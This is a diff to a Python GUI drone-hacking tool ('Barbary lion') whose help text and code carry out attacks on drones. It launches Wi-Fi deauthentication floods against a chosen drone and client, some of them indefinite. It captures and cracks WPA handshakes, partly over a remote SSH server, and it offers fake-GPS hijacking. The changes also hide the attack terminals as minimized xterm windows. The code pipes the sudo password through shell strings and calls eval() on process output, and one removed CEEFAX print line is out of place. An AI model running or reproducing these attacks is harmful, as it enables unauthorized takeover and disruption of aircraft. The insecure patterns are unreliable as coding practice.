@@ -114,7 +114,7 @@ class StartPage(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "Thank you for using this programe.\nTo start, please select one option on the page.\n\nWi-Fi base drone: Exploit Wi-Fi attack to get the drone control rights.\n\nRF base drone: Using fake GPS signal to hijack the drone."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
 
@@ -199,7 +199,7 @@ class SelectInterface(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "Please ready your Wi-Fi adapter, and make sure your adapter supports 'monitor' mode.\n\nIf you are connected to your Wi-Fi adapter correctly, you can see the adapter name on the screen."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
     
@@ -355,7 +355,7 @@ class APDisplay(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "To continue, please select one Wi-Fi access point.\n\nThe program will scan the nearby Wi-Fi access point. If the Wi-Fi network is broadcast from the drone, and match with the 'drone manufacturer list' files, the program will highlight that Wi-Fi access point."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
 
@@ -396,7 +396,7 @@ class APDisplay(tk.Frame):
         self.check_dump_file = Path(current_path + "/data/ap_list-01.csv")
         if self.check_dump_file.is_file(): #Check "ap_list-01.csv" is really exist
             subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/data/ap_list-01.csv", stdout = subprocess.PIPE, shell = True)
-        access_point_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'airodump-ng " + selected_interface + " -w " + current_path + "/data/ap_list -o csv'" 
+        access_point_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'accesspointinfo' -hold -e 'airodump-ng " + selected_interface + " -w " + current_path + "/data/ap_list -o csv'"
         get_access_point_info_states = subprocess.Popen(access_point_info, stdout = subprocess.PIPE, shell=True)
         access_point_info_states = get_access_point_info_states.poll()
         while access_point_info_states == None:
@@ -590,7 +590,14 @@ class APDisplay(tk.Frame):
             messagebox.showwarning("Tips", "You must select a Access Point.")
 
     def destroy_ap_display_gui(self): #Kill ap_display_gui object
-        subprocess.Popen("echo " + sudo_password + " | sudo -S killall airodump-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
+        find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T accesspointinfo -hold -e airodump-ng " + selected_interface + " -w " + current_path + "/data/ap_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
+        get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+        xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
+        xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
+        xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
+        return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
+        colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
+        subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) #For close the xterm airodump terminal
         time.sleep(1.0)
         self.title_label.destroy()
         self.stop_start_button.destroy()
@@ -661,14 +668,21 @@ class GetSelectedAPClientINFO(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "To continue, please select one client for the attack.\n\nThe program will scan the client(s) on your selected Wi-Fi access point. If there have only one client find on the Wi-Fi access point, the program will select that client automatically. Otherwise, you need to select which clients you want to attack."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
     
     def menubar_home(self):
         try:
             self.progressbar.stop()
-            subprocess.Popen("echo " + sudo_password + " | sudo -S killall airodump-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
+            find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
+            get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+            xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
+            xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
+            xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
+            return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
+            colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
+            subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
             time.sleep(0.5)
             self.destroy_get_selected_ap_client_gui()
             self.controller.show_frame("StartPage")
@@ -680,7 +694,7 @@ class GetSelectedAPClientINFO(tk.Frame):
         self.check_dump_file = Path(current_path + "/data/client_list-01.csv")
         if self.check_dump_file.is_file(): #Check "client_list-01.csv" is really exist
             subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/data/client_list-01.csv", stdout = subprocess.PIPE, shell = True)
-        client_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv'"
+        client_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'clientinfo' -hold -e 'airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv'"
         get_client_info_states = subprocess.Popen(client_info, stdout = subprocess.PIPE, shell = True)
         client_info_states = get_client_info_states.poll()
         while client_info_states == None:
@@ -725,7 +739,14 @@ class GetSelectedAPClientINFO(tk.Frame):
                     dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                     dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                 if messagebox.askretrycancel("Error", "No client found in your selected Access Point."):
-                    subprocess.Popen("echo " + sudo_password + " | sudo -S killall airodump-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
+                    find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
+                    get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+                    xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
+                    xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
+                    xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
+                    return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
+                    colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
+                    subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
                     self.info_label.config(text = "Please wait.")
                     threading.Thread(target = self.load_client).start()
         except:
@@ -743,7 +764,14 @@ class GetSelectedAPClientINFO(tk.Frame):
                 dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                 dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
             if messagebox.askretrycancel("Error", "No client found in your selected Access Point."):
-                subprocess.Popen("echo " + sudo_password + " | sudo -S killall airodump-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
+                find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
+                get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+                xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
+                xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
+                xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
+                return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
+                colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
+                subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
                 self.info_label.config(text = "Please wait.")
                 threading.Thread(target = self.load_client).start()
 
@@ -793,7 +821,14 @@ class GetSelectedAPClientINFO(tk.Frame):
             states_log = ["Client BSSID selected"]
             dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
             dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
-        subprocess.Popen("echo " + sudo_password + " | sudo -S killall airodump-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
+        find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
+        get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+        xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
+        xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
+        xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
+        return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
+        colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
+        subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
         self.destroy_get_selected_ap_client_gui()
         self.controller.show_frame("WifiAttack")
 
@@ -855,7 +890,7 @@ class WifiAttack(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "Attack drone based on different cases.\n\nPlease follow the instruction from the program."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
 
@@ -1037,15 +1072,22 @@ class WifiAttack(tk.Frame):
             self.step4_label.config(text = "")
         self.info_label.config(text = "Collecting 4-way handshake.")
         four_way_handshake_file_timestamp = time.strftime("%Y%m%d-%H%M%S") #Create a timestamp for 4-way handshake file
-        deauth_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'aireplay-ng -0 35 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
-        four_way_handshake_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'airodump-ng -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + " " + selected_interface + "'"
+        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -e 'aireplay-ng -0 35 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
+        four_way_handshake_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'handshakeinfo' -hold -e 'airodump-ng -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + " " + selected_interface + "'"
         #print(deauth_info)
         #print(four_way_handshake_info)
         subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
         subprocess.Popen(four_way_handshake_info, stdout = subprocess.PIPE, shell = True)
         time.sleep(22.0)
-        close_airodump_terminal = subprocess.Popen("echo " + sudo_password + " | sudo -S killall airodump-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
-        close_airodump_terminal.wait()
+        find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T handshakeinfo -hold -e airodump-ng -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
+        get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+        xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
+        xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
+        xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
+        return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
+        colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
+        close_xterm_airodump_terminal = subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) #For close the xterm airodump terminal
+        close_xterm_airodump_terminal.wait()
         check_four_way_handshake = "echo " + sudo_password + " | sudo aircrack-ng " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.cap -j " + current_path + "/handshake/hashcat_convert_file/" + selected_bssid + "_" + four_way_handshake_file_timestamp + " 2>&1 | grep Successfully | awk '{print $1}'"
         #print(check_four_way_handshake)
         get_four_way_handshake_states = subprocess.Popen(check_four_way_handshake, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
@@ -1170,11 +1212,18 @@ class WifiAttack(tk.Frame):
                                 elif get_messagebox_states == None:
                                     handshake_message = "4 way handshake file save at: " + current_path + "/handshake, the name is:\n" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.\n\nWould you like to keep running deauthentication attack to prevent the client reconnect to the drone?"
                                     if messagebox.askyesno("Request Processed", handshake_message):
-                                        deauth_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
+                                        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                                         subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
                                         if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
-                                            close_aireplay_terminal = subprocess.Popen("echo " + sudo_password + " | sudo -S killall aireplay-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
-                                            close_aireplay_terminal.wait()
+                                            find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
+                                            get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+                                            xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
+                                            xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
+                                            xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
+                                            return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
+                                            colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
+                                            close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
+                                            close_xterm_aireplay_terminal.wait()
                                             time.sleep(0.3)
                                             self.destroy_wifi_attack_gui()
                                             self.controller.show_frame("StartPage")
@@ -1522,11 +1571,18 @@ class WifiAttack(tk.Frame):
                     self.encrypted_wifi_network()
                 elif get_messagebox_states == None:
                     if messagebox.askyesno("Request Processed", "Would you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
-                        deauth_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
+                        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                         subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
                         if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
-                            close_aireplay_terminal = subprocess.Popen("echo " + sudo_password + " | sudo -S killall aireplay-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
-                            close_aireplay_terminal.wait()
+                            find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
+                            get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+                            xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
+                            xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
+                            xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
+                            return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
+                            colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
+                            close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
+                            close_xterm_aireplay_terminal.wait()
                             time.sleep(0.3)
                             self.destroy_wifi_attack_gui()
                             self.controller.show_frame("StartPage")
@@ -1691,7 +1747,7 @@ class RemoteServerConnect(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "Crack the password through the remote server to improve the effectiveness of cracking a password.\n\nTo enjoy the faster password cracking effectiveness, please type in the remote server login information."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
 
@@ -1830,7 +1886,7 @@ class RemoteServerConnect(tk.Frame):
 
     def ssh_connect(self):
         if messagebox.askyesno("Wi-Fi Deauthentication", "Would you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
-            deauth_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
+            deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
             subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
             self.wifi_deauthentication_states = True
         try:
@@ -1875,8 +1931,15 @@ class RemoteServerConnect(tk.Frame):
                     cracked_wifi_password = get_cracked_wifi_password
             client.close() #Close SSH connection
             if self.wifi_deauthentication_states == True:
-                close_aireplay_terminal = subprocess.Popen("echo " + sudo_password + " | sudo -S killall aireplay-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
-                close_aireplay_terminal.wait()
+                find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
+                get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+                xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
+                xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
+                xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
+                return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
+                colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
+                close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
+                close_xterm_aireplay_terminal.wait()
             self.progressbar.stop()
             self.start_button.config(state = "normal")
             try:
@@ -1935,11 +1998,18 @@ class RemoteServerConnect(tk.Frame):
                         dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                     self.info_label.config(text = "Failed to crack the password.")
                     if messagebox.askyesno("Error", "Failed to crack the password.\n\nWould you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
-                        deauth_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
+                        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                         subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
                         if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
-                            close_aireplay_terminal = subprocess.Popen("echo " + sudo_password + " | sudo -S killall aireplay-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
-                            close_aireplay_terminal.wait()
+                            find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
+                            get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+                            xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
+                            xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
+                            xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
+                            return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
+                            colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
+                            close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
+                            close_xterm_aireplay_terminal.wait()
                             time.sleep(0.3)
                             self.destroy_remote_server_login_gui()
                             self.controller.show_frame("StartPage")
@@ -1962,11 +2032,18 @@ class RemoteServerConnect(tk.Frame):
                     dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                 self.info_label.config(text = "Failed to crack the password.")
                 if messagebox.askyesno("Error", "Failed to crack the password.\n\nWould you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
-                    deauth_info = "echo " + sudo_password + " | sudo -S gnome-terminal --geometry=1x1 -x bash -c 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
+                    deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                     subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
                     if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
-                        close_aireplay_terminal = subprocess.Popen("echo " + sudo_password + " | sudo -S killall aireplay-ng", stdout = subprocess.PIPE, shell = True) #For close the gnome-terminal
-                        close_aireplay_terminal.wait()
+                        find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
+                        get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
+                        xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
+                        xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
+                        xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
+                        return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
+                        colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
+                        close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
+                        close_xterm_aireplay_terminal.wait()
                         time.sleep(0.3)
                         self.destroy_remote_server_login_gui()
                         self.controller.show_frame("StartPage")
@@ -2309,7 +2386,7 @@ class FindHackrfDevice(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "To start, please ready your HackRF One and install 'hackrf' tools.\n\nIf you are connected to your HackRF One correctly, you can see the device information on the screen."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
 
@@ -2566,7 +2643,7 @@ class RFLocationSelect(tk.Frame):
         help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                     "For the fake GPS function, please select one location or select 'Customize' to type your GPS coordinate on the page.\n\nAfter that, press the 'Start attack' button to start the transmission of the fake GPS signal until you press the 'Stop attack' button."))
         help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
-                                    "Code name: Barbary lion\nVersion: 1.1.0.109\n\nGroup member:\nKAN Hung Wing\nYUEN Yat Hong\nSHEK Siu Yin"))
+                                    "Code name: Barbary lion\nVersion: 1.1.1.110\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
         menubar.add_cascade(label = "Help", menu = help_tool)
         return menubar
     
@@ -2951,7 +3028,7 @@ if __name__ == "__main__":
         app.iconphoto(True, tk.PhotoImage(file = current_path + "/data/gui_img/drone_main_icon.png"))
     except:
         pass
-    print(" P100      CEEFAX 1    100             Tue 22 Jun 02:47/12 ")
